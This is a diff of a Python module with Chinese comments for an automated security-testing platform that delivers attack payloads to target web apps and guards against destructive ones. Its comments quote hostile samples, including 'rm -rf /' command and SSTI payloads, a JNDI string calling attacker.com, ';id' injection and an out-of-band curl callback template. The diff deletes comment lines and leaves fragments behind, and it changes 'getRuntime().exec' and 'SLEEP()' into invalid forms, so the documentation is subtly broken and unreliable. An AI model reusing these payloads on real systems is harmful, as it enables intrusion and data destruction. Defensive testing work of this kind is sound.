@@ -1,6 +1,5 @@
 """D1 真实攻击上下文：把 A2 构造的攻击载荷与账户上下文随 TriggerSpec 登记。
 
-2026-08-29 评审的三条铁律（本模块是其单一落点）：
 
 1. payload 构造是 A2 的职责，D1 只负责投放。
    D1 绝不硬编码任何探测串 —— `' OR 1=1--`、`{{7*7}}` 这类是「最小威力探测」，
@@ -47,7 +46,6 @@ logger = logging.getLogger(__name__)
 TRACE_HEADER = "X-SASTAI-Trace"
 
 # 业务逻辑族（D1 路由用 category 白名单）：真源见 src/core/exploit_spec.py 的
-# DIFFERENTIAL_PROOF_FAMILIES（9 类规范 token）+ 别名表（2026-09-03 合并 P1–P5 五套判据）。
 # 此处直接引用规范集；旧 category 写法（vertical / cross_business / statemachine 等）经
 # canonical_business_logic_family 归一后映射到规范 token，无需在此重复列举。
 BUSINESS_LOGIC_CATEGORIES = frozenset(DIFFERENTIAL_PROOF_FAMILIES)
@@ -147,7 +145,6 @@ def select_attack_payloads(exploit_spec: Optional[Dict[str, Any]] = None,
     """
     payload = (exploit_spec or {}).get("payload") or {}
     if not isinstance(payload, dict):
-        # 2026-11-02：payload 有两种形态在流里 —— exploit_spec 里是 dict（含
         # candidate_payloads），而 A2 per-file spec 里可能是**字符串**。
         # 字符串形态下合成器把候选写在兄弟键 `payload_candidates`，这里兼容读取，
         # 否则「合成了但没人用」会再次发生。
@@ -174,7 +171,6 @@ def select_attack_payloads(exploit_spec: Optional[Dict[str, Any]] = None,
             # 跳过 → 让 spec 落到 sca_forge 去造真字节（兜底一致性，评审）。
             if _is_ysoserial_text_label(text):
                 continue
-            # 族-载荷一致性自检（2026-09-22，②-1）：形状与族不符的弹一律丢弃，
             # 让调用方继续走弹药库补位，而不是把废弹原样投出去。
             if classify_payload_family_mismatch(text, family):
                 logger.info(
@@ -207,9 +203,7 @@ def select_attack_payloads(exploit_spec: Optional[Dict[str, Any]] = None,
 
 
 # ============================================================================
-# 族-载荷一致性自检（2026-09-22 落地，评审 ②-1）
 #
-# 背景：A2（LLM）会跨族串模板——实测 java-sec-code 上出现
 #   · SSRF 族的载荷是 `http://127.0.0.1:8080;rm -rf /`、`; rm -rf /` 这类 shell 命令模板
 #     （分号后的 shell 片段不参与 SSRF 语义，且 `;` 在 URL 里常被判非法 → 请求直接失败）；
 #   · CRLF 族的载荷是 `test1=; rm -rf /` —— CRLF 需要的是 `%0d%0a` 换行序列，命令注入载荷完全无效；
@@ -243,7 +237,6 @@ _CRLF_MARKER_RE = re.compile(r"%0d%0a|%0a%0d|%0d|%0a|%0D%0A|\r|\n", re.IGNORECAS
 # 要求至少一个点分段（避免把 `abcd` 这类短 base64 误判成类名）。
 _CLASSNAME_ONLY_RE = re.compile(r"^(?:java:)?[a-zA-Z_$][\w$]*(?:\.[a-zA-Z_$][\w$]*)+(?:@[0-9a-fA-F]+)?$")
 
-# 表达式注入（2026-11-04）：两个形态判定。
 #
 # ① 赋值语句：`name = expr` / `name := expr` / `obj.prop = expr`
 #    —— 表达式引擎求值的是**整个输入**，赋值不是求值（QLExpress 的 /vuln1 读整个
@@ -251,7 +244,7 @@ _CLASSNAME_ONLY_RE = re.compile(r"^(?:java:)?[a-zA-Z_$][\w$]*(?:\.[a-zA-Z_$][\w$
 _EXPR_ASSIGN_RE = re.compile(
     r"^\s*[A-Za-z_$][\w$]*(?:\s*\.\s*[A-Za-z_$][\w$]*)*\s*(?::=|=(?!=))\s*\S")
 # ② 只有副作用、不产生可观测求值结果的语句：`System.out.println(...)` /
-#    `print(...)` / `console.log(...)` / `Runtime.getRuntime().exec(...)`
+#    `print(...)` / `console.log(...)` / `Runtime.getRuntime.exec(...)`
 #    —— 判据是「响应里出现求值结果」（如 49），这些语句没有返回值 ⇒ 无从确认。
 _EXPR_SIDE_EFFECT_ONLY_RE = re.compile(
     r"^\s*(?:System\.out\.(?:print|println|printf)\s*\(|print\s*\(|print\s+"
@@ -269,7 +262,6 @@ def _payload_check_group(family: str) -> Optional[str]:
         return "crlf"
     if "deserial" in f or "unserial" in f or "反序列化" in f:
         return "deserialization"
-    # P2（2026-09-29）：jndi 协议族（jndi_injection/rmi/ldapi/ldap_injection）共用归组入口——
     # 归组函数唯一来源是 src.core.family_sink_registry.family_group，此处不得另立映射。
     try:
         from src.core.family_sink_registry import family_group as _fam_group
@@ -279,18 +271,14 @@ def _payload_check_group(family: str) -> Optional[str]:
     except Exception:
         pass
     # 命令/OS 注入族：此前无归组 → family_minimal_payload 返回 None → D1 退化为纯 canary 重放，
-    # 不含任何注入元字符，WAF/过滤器白名单放行（java-sec-code /codeinject/sec 的 cmdFilter 只拦
     # `;|&` 等），_is_waf_blocked 恒 False → escalate_variant 变体梯子在真实扫描里永不点火
-    # （run 49 实测 variant_escalated=0）。补最小可用弹 `;id`（非破坏性 info disclosure，且 `;`
     # 正是 cmdFilter 触发字符）→ 真实扫描即可让 WAF 拦截→escalate，钉死 C 验证。
     if any(k in f for k in ("command", "os_command", "os-exec", "rce", "_exec", "cmdi")):
         return "command_execution"
-    # 2026-11-04（jsc 619 实测）：表达式注入族（QLExpress / SpEL / OGNL 一类）此前
     # **没有归组** ⇒ 族-载荷一致性自检对它恒放行 ⇒ A2 造的占位载荷会**占住**
     # spec.attack_payloads ⇒ D1 的「载荷为空 → 走弹药库补位」分支永不触发 ⇒
     # 族载荷库（expr_arith：7*7 / #{7*7}）永远不会被调用。
     #
-    # 实测（本轮 spec 237801 /vuln1，QLExpress）：A2 造的载荷是
     #   `express = 'System.out.println("Hello, World!");'`
     # —— ① 它是**赋值语句**不是表达式（QLExpress 端点读整个 request body 求值，
     #        参数名根本不叫 express）；② 它只是打印，**不产生可观测的求值结果**
@@ -340,8 +328,6 @@ def classify_payload_family_mismatch(payload: Any, family: Any) -> Optional[str]
             return None
         if _CLASSNAME_ONLY_RE.match(text):
             return "deserialization_payload_is_class_name"
-        # 2026-09-28：此前「既不是序列化流、也不是纯类名」的占位串一律放行
-        # （末尾 return None），实测 run 33 的
         # `java:com.sun.rowset.JdbcRowSetImpl;serialization=1;url=http://attacker.com/exploit`
         # 正是这种形态——它占据了 spec 的 attack_payloads，使 D1 的
         # ``if not attack_payloads`` 补位分支永不触发，真 gadget 永远不被构造，
@@ -357,7 +343,6 @@ def classify_payload_family_mismatch(payload: Any, family: Any) -> Optional[str]
         # 表达式注入（QLExpress / SpEL / OGNL）：载荷必须是**被求值的表达式**，
         # 且必须产生**可观测的求值结果**（判据 = 响应里出现求值结果，如 49）。
         #
-        # 2026-11-04（jsc 619 spec 237801 实测）：A2 造的
         # `express = 'System.out.println("Hello, World!");'` 被当成合法载荷放行 ⇒
         # 它占住 attack_payloads ⇒ 族载荷库（7*7 / #{7*7}）永不触发 ⇒ 该真值点恒漏。
         #
@@ -403,11 +388,9 @@ def filter_payloads_by_family(payloads: List[str], family: Any) -> tuple:
 _FAMILY_MINIMAL_PAYLOAD = {
     "ssrf": "http://127.0.0.1:8080/",
     "crlf": "%0d%0aX-SastAI-Injected: 1",
-    # P2（2026-09-29）：jndi 协议组最小兜底弹（打本地回环 LDAP，无害探针）。
     # rmi/jndi_injection/ldapi/ldap_injection 经归组后都取这一发，保证「载荷为空」
     # 不再出现在 jndi 协议族。
     "jndi": "${jndi:ldap://127.0.0.1:1389/sastai-probe}",
-    # 命令/OS 注入族最小可用弹：`;id` 非破坏性（仅执行 id 取当前用户），且 `;` 是 java-sec-code
     # /codeinject/sec cmdFilter 白名单的拦截字符（命中返回 "Bad boy. I got u."），用于钉死
     # escalate_variant 变体梯子（C 验证）。无 WAF 的真实命令端点则实际执行 id，得到真实 RCE 影响证据。
     "command_execution": ";id",
@@ -465,7 +448,7 @@ def _selfcheck_or_raise(payloads: List[str]) -> None:
 def spec_attack_payloads(spec: Optional[Dict[str, Any]] = None) -> List[str]:
     """从 TriggerSpec 取出真实攻击 payload（兼容两种来源形态）。
 
-    - 内存态（A2 登记时直传）：spec["attack_payloads"] 是 list。
+    - 内存态：spec["attack_payloads"] 是 list。
     - DB 态（load_trigger_specs_by_workspace 的 SELECT *）：spec["attack_payloads_json"] 是 JSON 字符串。
     两种都要支持，否则 D1 在 DB 回放路径上永远读不到 payload 而静默退化为纯探针。
     """
@@ -495,14 +478,13 @@ def spec_attack_payloads(spec: Optional[Dict[str, Any]] = None) -> List[str]:
 
 # ── 时间盲注承接：sleep 型 payload 的时延解析（D1 计时 + D2 确认门共用的单一真相源）──
 #
-# 背景（2026-09-07 承接断链修复）：时间盲注/命令注入 sleep 是「威力大不破坏」的典型攻击，
 # 但闭环实时链路只认 IAST sink-reached，从不测响应时延——一旦探针没织到该 sink（或
 # sink 在 DB 驱动内部不可织），时间盲注就"发得出、承接不上"，D2 只能判 no_evidence。
 # 修法：D1 重放时对同源 payload 计时，D2 增设「时延双阈值确认门」作为 sink-reached 的旁证兜底。
 # 计时侧（D1，填 sleep_seconds_hint / baseline_elapsed_ms）与判定侧（D2，双阈值）必须用
 # 同一份解析逻辑，否则计时基准与判定门对不齐 → 本模块是二者共用的唯一真相源。
 #
-# 覆盖方言：MySQL SLEEP()/子查询 sleep、PostgreSQL pg_sleep()、MSSQL WAITFOR DELAY、
+# 覆盖方言：MySQL SLEEP/子查询 sleep、PostgreSQL pg_sleep、MSSQL WAITFOR DELAY、
 # Oracle dbms_pipe.receive_message、shell sleep N（Oracle 为 M6 补，与 sql_dialect 的造弹成对）。
 # 只解析「预期时延秒数」这一件事，绝不在此判定攻击是否成功——成功判定归 D2 的双阈值门。
 _SLEEP_PATTERNS = (
@@ -589,12 +571,10 @@ def neutralize_sleep_payload(payload: Any) -> str:
     return out
 
 
-# ── 破坏性 SQL payload 降级（3.4-C，2026-09-10 落地）──
 #
 # 背景：真实扫描环境不会为靶标 DB 做定时自愈（只有本地靶场有看门狗 + FileDbInitConfig 每次启动
 # 补种 schema），破坏性 payload（DROP TABLE / TRUNCATE / 无 WHERE 的 DELETE·UPDATE / ALTER TABLE）
 # 一旦在靶标 DB 上真的执行，数据被永久破坏、只能人工回滚，且会污染之后所有轮次的业务逻辑确认
-# （靶场跑不了 → 全是假阴性）。实测 target-mall 的 H2 文件库被 D2 重放真执行过
 # DROP TABLE t_product ×72、users ×87。
 #
 # 修法：D1 投放前把破坏性 SQL payload 降级为「语法错误型探针」（默认未闭合单引号 `'`），仍能
@@ -615,11 +595,9 @@ _DESTRUCTIVE_SQL_PATTERNS = (
 # 两种都会让 DB 报错，从而证明输入到达 SQL 解析器，但不改动任何数据。
 _SYNTAX_ERROR_PROBE = "'"
 
-# ── 破坏性命令 payload 中和（R24-D 第二类破坏性：payload 是系统命令而非 SQL）──
 #
-# 事故面：SSTI/SpEL/命令注入的 payload 里可能嵌**真会毁机**的命令。实测 A2 给
 # `/marketing/preview`（SSTI）产出的 payload 之一就是
-#   tpl=[[${T(java.lang.Runtime).getRuntime().exec("rm -rf /")}]]
+#   tpl=[[${T(java.lang.Runtime).getRuntime.exec("rm -rf /")}]]
 # 一旦 SSTI 真的生效，靶机/宿主就被删盘（不可逆）。SQL 那一层完全看不见它。
 #
 # 修法：结构化 payload（exec("...")）只把 exec 的**参数**换成无害探针 whoami（保留 payload
@@ -681,7 +659,7 @@ def normalize_attack_payload(payload: Any, param_name: Any = "") -> str:
     """去掉 A2 误把「参数名=值」整串当 payload 的前缀（payload 应只是**值**）。
 
     背景（#8 SSTI 未确认的真因）：A2 给 `/marketing/preview` 产出
-    `tpl=[[${T(java.lang.Runtime).getRuntime().exec("calc")}]]`，D1 又把它作为 `tpl` 参数的值
+    `tpl=[[${T(java.lang.Runtime).getRuntime.exec("calc")}]]`，D1 又把它作为 `tpl` 参数的值
     注入 → 目标收到 `tpl=tpl=[[${...}]]` → Thymeleaf 按字面渲染，SSTI 永不触发、D2 恒 no_evidence。
     这里按 param_name 剥掉前缀，恢复 payload 的真实形态。
     """
@@ -745,13 +723,10 @@ def downgrade_destructive_payload(payload: Any, family: str = "",
     return text
 
 
-# ── 破坏性操作闸门（R24-D，2026-09-10 落地）──
 #
 # 为什么 3.4-C 不够：`is_destructive_sql_payload` 只看「payload 文本里有没有破坏性 SQL」。
-# 破坏性还有第二个维度 —— **端点自身的语义**。真实事故：`POST /ops/user/delete`（只判登录、
 # 未判角色）的 D1 重放，投放的是**合法业务请求**（payload 是一个真实 uid），
 # handler 直接 `userMapper.deleteById(uid)` —— 请求里没有任何 SQL 关键字，第一层防线完全看不见它，
-# 结果是 target-mall 的 T_USER 里 admin / alice / bob 被真删光（只剩 carol），
 # 此后所有 vertical spec 登录失败 → 全判 no_evidence（假阴性），且真实环境不自愈、只能人工回滚。
 #
 # 修法：按 (method, endpoint) 语义给操作风险分类，三档处置（与 3.4-C 同一哲学：证明力换安全）：
@@ -786,10 +761,8 @@ _STATUS_OVERWRITE_RE = re.compile(
     r"(?i)(?:^|/)(?:review|approve|reject|moderate|ban)(?:/|$|[_\-])"
 )
 
-# ── 进程生命周期 / 自毁端点闸门（2026-09-21 落地，item 一）──
 #
 # 为什么单列一类并置顶拦截：这类端点一旦命中，会重启/终止**正在被验证的目标进程本身**。它既是
-# 不可逆副作用，又会让当前 D2 批次整体作废 —— 实测 run 24 卡死 phase=d2、8080 端口一度 DOWN，
 # 正是 SSRF spec 把回显地址指向靶场自身管理端点（/restart、/shutdown、/actuator/shutdown）所致。
 #
 # 判定要点（与既有破坏性闸门互补，不是替代）：
@@ -844,7 +817,6 @@ def _iter_text_values(*objs: Any) -> List[str]:
 _ABSENT_ID_SAFE_CATEGORIES = ("data_destroy", "money_out", "status_overwrite")
 _SKIP_CATEGORIES = ("credential_mutation", "mass_assignment", _LIFECYCLE_CATEGORY)
 
-# R26：可回滚验证类别。这两类在 R24 被整条 skip，导致 #24 越权改密 / #25 批量赋值提权
 # 结构上不可能 confirmed（F1 上限被压到 13 < 门槛 16）。
 # 它们的共同点是「把标量字段写到某个可定位资源上」——因此可以取基线快照、投放、再把基线写回。
 # 放行的前提是调用方严格遵守 restore_after 契约（见 neutralize_destructive_spec 的 guard.reason）：
@@ -854,7 +826,6 @@ _SKIP_CATEGORIES = ("credential_mutation", "mass_assignment", _LIFECYCLE_CATEGOR
 # 契约由调用方（d1_service）实现，闸门只负责放行并声明要求。
 _RESTORE_AFTER_CATEGORIES = ("credential_mutation", "mass_assignment")
 
-# 总开关：置 0 时这两类退回 R24 的整条 skip（靶标完全不接受写入，或排障对比用）。
 RESTORE_AFTER_ENABLED = str(os.environ.get("SAST_AI_RESTORE_AFTER", "1")).strip().lower() not in ("0", "false", "no", "off")
 
 # 资源 id 参数名白名单（分段匹配，避免 "id" 误伤 "identity" / "idea" 这类）。
@@ -954,7 +925,7 @@ def _rewrite_id_values(obj: Any) -> Any:
 
 
 def neutralize_destructive_spec(spec: Any) -> "tuple[Dict[str, Any], Dict[str, Any]]":
-    """对触发规格做破坏性闸门归一（R24-D，单一真相源）。
+    """对触发规格做破坏性闸门归一。
 
     返回 (归一后的 spec 副本, guard 记录)。guard 为空 dict 表示无需干预。
     guard["action"] ∈ {"absent_id", "skip"}：
@@ -971,7 +942,6 @@ def neutralize_destructive_spec(spec: Any) -> "tuple[Dict[str, Any], Dict[str, A
     if not category:
         return src, {}
 
-    # R26：可回滚验证优先于 skip。开关默认开；置 SAST_AI_RESTORE_AFTER=0 可退回 R24 的整条 skip 行为
     # （排障或靶标不接受任何写入时用）。
     if category in _RESTORE_AFTER_CATEGORIES and RESTORE_AFTER_ENABLED:
         note = {
@@ -1003,7 +973,6 @@ def neutralize_destructive_spec(spec: Any) -> "tuple[Dict[str, Any], Dict[str, A
     pname = out.get("param_name")
     _template_id = re.search(r"\{(\w*[Ii]d)\}", str(endpoint))
 
-    # R24-D 补强①：破坏性动作必须「由资源 id 定位」才谈得上用哨兵中和。若变更本体骑在**非 id 参数**
     # 上（/wallet/withdraw 的 amount、/api/comment/moderate 的 status），把资源 id 换成哨兵并不能
     # 阻止真实持久化变更（金额照扣、状态照写）→ 一律 skip，不靠「id 是假的」自我安慰。
     if pname and not is_id_param_name(pname) and not _template_id:
@@ -1018,7 +987,6 @@ def neutralize_destructive_spec(spec: Any) -> "tuple[Dict[str, Any], Dict[str, A
                        note["method"], note["endpoint"], pname, category)
         return src, note
 
-    # R24-D 补强②：param_name 是 id 类名就钉哨兵，**不再要求 spec 已带 param_value 键**。
     # 否则 replay_vertical 会在 param_value 缺失时回填「受害者真实 uid」
     # （d1_service.replay_vertical：param_name 有值且 param_value 为空 → 取 victim/attacker 的 user_id），
     # 哨兵形同虚设，真删/真改照旧发生。
@@ -1026,7 +994,6 @@ def neutralize_destructive_spec(spec: Any) -> "tuple[Dict[str, Any], Dict[str, A
         out["param_value"] = ABSENT_RESOURCE_ID
         changed.append(str(pname))
 
-    # R24-D 补强③：victim_resource_id 一并钉死（**含 VICTIM_FROM_POOL**）。
     # VICTIM_FROM_POOL 只是登记期占位，重放期会被解析成真实 victim 对象 id（replay_bola / replay_race），
     # 破坏性端点若留着它，absent_id 分支仍会把真实受害者 id 发出去 → 必须换成哨兵。
     vid = out.get("victim_resource_id")
@@ -1052,7 +1019,6 @@ def neutralize_destructive_spec(spec: Any) -> "tuple[Dict[str, Any], Dict[str, A
         for rp in reps:
             rp2 = dict(rp) if isinstance(rp, dict) else rp
             if isinstance(rp2, dict):
-                # R24-D 补强④：兼容两种键形 —— 内存态 param_name/param_value，
                 # DB 态（trigger_specs.representative_request_params_json，由 entry_discovery 产出）name/value。
                 # 只认 param_name 会让 DB 态 spec 的 id 参数漏改 → 真实 id 照旧发出去。
                 _rn = rp2.get("param_name") or rp2.get("name")
@@ -1220,7 +1186,7 @@ def _load_sca_components(db: Any, spec: Optional[Dict[str, Any]]) -> List[Dict[s
 
 
 def _oob_command(spec: Dict[str, Any]) -> str:
-    """反序列化族的带外可回执命令（第四层，2026-09-28 ）。
+    """反序列化族的带外可回执命令。
 
     为什么必须用 OOB：gadget 一旦在服务端执行，本地没有可观测副作用（exec 的是靶机进程），
     平台要证明「payload 真被执行」只能靠跨网络回执。这里把平台可控的唯一域名嵌进 gadget
@@ -1249,7 +1215,6 @@ def _oob_command(spec: Dict[str, Any]) -> str:
             pass
         # 原地回写：D1 重放侧与人工核对都从 spec 上取 token，避免跨进程传参丢失。
         spec["oob_token"] = token
-        # 命令模板可配（2026-09-29）：公网权威域名场景用默认 DNS 形态
         # （``nslookup <token>.<base>``，回执端配 DNS 模式）；无公网域名 / 靶机与平台同机的
         # 实验室场景用 ``SAST_AI_OOB_COMMAND_TEMPLATE`` 指定回执通道，例如
         # ``curl -s http://127.0.0.1:8088/{token}``（回执端配 HTTP 模式，token 走路径）。
@@ -1285,7 +1250,6 @@ def sca_forge_attack_payloads(spec: Optional[Dict[str, Any]] = None,
     返回空列表表示无弹可投，调用方必须按 attack_degraded 处理。
     """
     spec = spec or {}
-    # 第四层（，2026-09-28）：反序列化族优先使用带外可回执命令，使 payload 一旦在服务端
     # 执行就产生一次可核对的 DNS 回执。未启用 OOB 时回落默认命令（本地 ping，无回执但无害）。
     _is_deser = str(spec.get("category") or spec.get("family") or "").strip().lower() == "deserialization"
     _forge_cmd = command or ""
@@ -1353,7 +1317,6 @@ def sca_forge_attack_payloads(spec: Optional[Dict[str, Any]] = None,
 
     try:
         from src.iast.payload_forge import PayloadForge
-        # 2026-09-19：把 gateway 透传下去。原实现构造的是无 gateway 的 PayloadForge，
         # 而 PayloadForge._forge_from_llm 开头就是 `if self.gateway is None: return []`，
         # 于是「LLM 兜底造弹」这条腿无论武器库命中与否都恒不生效（静默、不报错）。
         forge = forge or PayloadForge(gateway=gateway)
